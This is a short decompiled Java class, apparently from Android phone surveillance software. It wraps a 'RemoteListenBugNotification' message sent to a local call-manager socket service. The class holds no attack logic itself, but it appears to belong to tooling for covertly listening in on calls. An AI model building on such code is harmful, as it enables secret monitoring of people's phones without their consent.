package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.BugNotification;

public class RemoteListenBugNotification
  extends SocketCmd
{
  private static final long serialVersionUID = -5010910225268803981L;
  
  public RemoteListenBugNotification(BugNotification paramBugNotification)
  {
    super(paramBugNotification, Boolean.class);
  }
  
  protected String getServerName()
  {
    return "com.fx.socket.callmgrd";
  }
  
  protected String getTag()
  {
    return "RemoteListenBugNotification";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/ref/command/RemoteListenBugNotification.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */